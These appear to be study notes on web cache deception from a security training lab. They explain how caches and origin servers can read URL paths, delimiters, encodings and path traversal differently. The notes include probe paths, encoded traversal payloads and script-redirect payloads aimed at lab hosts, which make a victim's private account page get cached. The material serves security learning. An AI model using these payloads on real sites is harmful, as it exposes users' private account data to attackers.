### Detecting cached responses
Various **response headers** may indicate that it is cached. For example:
- The `X-Cache` header provides information about whether a response was served from the cache. Typical values include:
    - `X-Cache: hit` - The response was served from the cache.
    - `X-Cache: miss` - The cache did not contain a response for the request's key, so it was fetched from the origin server. In most cases, the response is then cached. To confirm this, send the request again to see whether the value updates to hit.
    - `X-Cache: dynamic` - The origin server dynamically generated the content. Generally this means the response is not suitable for caching.
    - `X-Cache: refresh` - The cached content was outdated and needed to be refreshed or revalidated.
- The `Cache-Control` header may include a directive that indicates caching, like `public` with a `max-age` higher than `0`. Note that this only suggests that the resource is cacheable. It isn't always indicative of caching, as the cache may sometimes override this header.
## Exploiting static extension cache rules
### Path mapping discrepancies
There are a range of different mapping styles used by different frameworks and technologies. Two common styles are traditional URL mapping and RESTful URL mapping.
- ###### Traditional URL mapping represents a direct path to a resource located on the file system.
```http
http://example.com/path/in/filesystem/resource.html
- http://example.com : points to the server.
- /path/in/filesystem/ : represents the directory path in the server's file system.
- resource.html : is the specific file being accessed.
```
- ###### REST-style URLs don't directly match the physical file structure. They abstract file paths into logical parts of the API:
```http
http://example.com/path/resource/param1/param2
- http://example.com : points to the server.
- /path/resource/ : is an endpoint representing a resource.
- param1 and param2 : are path parameters used by the server to process the request.
```
Discrepancies in how the cache and origin server map the URL path to resources can result in web cache deception vulnerabilities. Consider the following example:
```http
http://example.com/user/123/profile/wcd.css
- An origin server using REST-style URL mapping:  may interpret this as a request for the /user/123/profile endpoint and returns the profile information for user 123, ignoring wcd.css as a non-significant parameter.
- A cache that uses traditional URL mapping: may view this as a request for a file named wcd.css located in the /profile directory under /user/123. It interprets the URL path as /user/123/profile/wcd.css. If the cache is configured to store responses for requests where the path ends in .css, it would cache and serve the profile information as if it were a CSS file.
```
### Exploiting path mapping discrepancies
For example, this is the case if modifying 
```http
/api/orders/123 -> /api/orders/123/foo
/api/orders/123/foo -> /api/orders/123/foo.js
 Try a range of extensions, including `.js`, `.css`, `.ico`, and `.exe`.
# If the response is cached, this indicates:
# - That the cache interprets the full URL path with the static extension.
# - That there is a cache rule to store responses for requests ending in `.js`.
```

```bash
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.css"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.exe"</script>
```
### Delimiter discrepancies
Consider the example `/profile;foo.css`:
- The Java Spring framework uses the `;` character to add parameters known as matrix variables. An origin server that uses Java Spring would therefore interpret `;` as a delimiter.
- Most other frameworks don't use `;` as a delimiter. Therefore, a cache that doesn't use Java Spring is likely to interpret `;` and everything after it as part of the path. If the cache has a rule to store responses for requests ending in `.css`, it might cache and serve the profile information as if it were a CSS file.
Consider these requests to an origin server running the Ruby on Rails framework, which uses `.` as a delimiter to specify the response format:
- `/profile.css` - This request is recognized as a CSS extension. There isn't a CSS formatter, so the request isn't accepted and an error is returned.
- `/profile.ico` - In this situation, if the cache is configured to store responses for requests ending in `.ico`, it would cache and serve the profile information as if it were a static file.
Encoded characters may also sometimes be used as delimiters. For example, consider the request `/profile%00foo.js`:
- The OpenLiteSpeed server uses the encoded null `%00` character as a delimiter. An origin server that uses OpenLiteSpeed would therefore interpret the path as `/profile`.
- Most other frameworks respond with an error if %00 is in the URL. However, if the cache uses Akamai or Fastly, it would interpret %00 and everything after it as the path. 
### Exploiting delimiter discrepancies
```http
# Firstly, find characters that are used as delimiters by the origin server. Start this process by adding an arbitrary string to the URL of your target endpoint: 
	/settings/users/list -> /settings/users/listaaa
# Next, add a possible delimiter character between the original path and the arbitrary string:
	/settings/users/list -> /settings/users/list;aaa:
```
Make sure to test all ASCII characters and a range of common extensions, including `.css`, `.ico`, and `.exe`. We've provided a list of potential delimiter characters to get you started in the labs, see the [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).
```bash
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.css"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.exe"</script>
```
### Delimiter decoding discrepancies
Consider the example `/profile%23wcd.css`, which uses the URL-encoded `#` character:
- The origin server decodes `%23` to `#`. It uses `#` as a delimiter, so it interprets the path as `/profile` and returns profile information.
- The cache also uses the `#` character as a delimiter, but doesn't decode `%23`. It interprets the path as `/profile%23wcd.css`. If there is a cache rule for the `.css` extension it will store the response.
### Exploiting delimiter decoding discrepancies
Make sure that you also test encoded non-printable characters, particularly `%00`, `%0A` and `%09`. If these characters are decoded they can also truncate the URL path.
## Exploiting static directory cache rules
Cache rules often target these directories by matching specific URL path prefixes, like:
```
/static - /assets - /scripts - /images
# Normalization discrepancies
/static/..%2fprofile
# You can also try encoding the full path traversal sequence, or encoding a dot instead of the slash.
```
### Detecting normalization by the origin server
To choose a non-cacheable resource, look for a non-idempotent method like `POST`. For example, modify `/profile` to `/aaa/..%2fprofile`:
- If the response doesn't match the base response, for example returning a `404` error message, this indicates that the path has been interpreted as `/aaa/..%2fprofile`
### Detecting normalization by the cache server
You can then choose a request with a cached response and resend the request with a path traversal sequence and an arbitrary directory at the start of the static path. Choose a request with a response that contains evidence of being cached. For example, `/aaa/..%2fassets/js/stockCheck.js`:
- If the response is no longer cached, this indicates that the cache isn't normalizing the path before mapping it to the endpoint. It shows that there is a cache rule based on the `/assets` prefix.
- If the response is still cached, this may indicate that the cache has normalized the path to `/assets/js/stockCheck.js`.
```
/assets/js/stockCheck.js -> /assets/..%2fjs/stockCheck.js
```
### Exploiting normalization by the origin server
```
/<static-directory-prefix>/..%2f<dynamic-path>
/assets/..%2fprofile
- The cache interprets the path as: `/assets/..%2fprofile`
- The origin server interprets the path as: `/profile`
```

```bash
/my-account§§abc
/resources/..%2fYOUR-RESOURCE
/resources/aaa
/aaa/..%2fmy-account
/resources/..%2fmy-account
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd.css"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd.js"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd.exe"</script>
```
### Exploiting normalization by the cache server
```
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
/profile%2f%2e%2e%2fstatic
- The cache interprets the path as: `/static`
- The origin server interprets the path as: `/profile%2f%2e%2e%2fstatic`

/profile;%2f%2e%2e%2fstatic
- The cache interprets the path as: `/static`
- The origin server interprets the path as: `/profile`  
```

```bash
# primer paso: /my-account§§abc
/aaa/..%2fresources/YOUR-RESOURCE
/my-account?%2f%2e%2e%2fresources
# valores obtenidor del primer paso, encoding: ? or #
/my-account%23%2f%2e%2e%2fresources
/my-account%3f%2f%2e%2e%2fresources
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd.css"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd.js"</script>
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd.exe"</script>
```
